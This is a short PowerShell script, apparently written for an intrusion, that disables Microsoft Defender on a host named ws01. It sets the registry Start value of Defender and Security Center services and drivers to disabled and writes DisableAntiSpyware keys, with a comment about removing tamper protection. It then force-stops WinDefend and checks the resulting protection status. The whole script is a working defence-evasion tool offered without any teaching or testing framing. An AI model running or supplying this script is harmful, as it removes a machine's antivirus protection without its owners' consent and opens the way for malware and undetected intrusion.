# Fully disable Defender services on ws01 via registry Start values (SYSTEM-ACL bypass)
$ErrorActionPreference = 'Continue'
$targets = @('WinDefend','WdNisSvc','SecurityHealthService','wscsvc','Sense','WdFilter','WdNisDrv')
foreach ($svc in $targets) {
  $key = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
  try {
    if (Test-Path $key) {
      $cur = (Get-ItemProperty $key -Name Start -ErrorAction SilentlyContinue).Start
      New-ItemProperty -Path $key -Name Start -Value 4 -Type DWord -Force -ErrorAction Stop | Out-Null
      Write-Output "REG $svc Start $cur -> 4 OK"
    } else {
      Write-Output "REG $svc not-present"
    }
  } catch { Write-Output "FAIL $svc $($_.Exception.Message)" }
}

# Also set DisableAntiSpyware + remove Tamper via MpPreference registry-compatible paths
foreach ($base in @('HKLM:\SOFTWARE\Microsoft\Windows Defender','HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender')) {
  try {
    New-ItemProperty -Path $base -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction Stop | Out-Null
    Write-Output "REG $base DisableAntiSpyware=1 OK"
  } catch { Write-Output "FAIL $base $($_.Exception.Message)" }
}

# Try to stop the service now that Start=4 (may still be denied until reboot)
try { Stop-Service WinDefend -Force -ErrorAction SilentlyContinue; Write-Output "STOP WinDefend OK" } catch { Write-Output "STOP WinDefend denied (expected until reboot): $($_.Exception.Message)" }
try { Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue; Write-Output "SET StartType Disabled OK" } catch { Write-Output "SET denied" }

# Final status
$st = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($st) { Write-Output "FINAL RTP=$($st.RealTimeProtectionEnabled) TP=$($st.IsTamperProtected) AV=$($st.AntivirusEnabled) AMSvc=$($st.AMServiceEnabled)" }
$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svc) { Write-Output "FINAL WINDEFEND=$($svc.Status)" }
Write-Output "DONE"
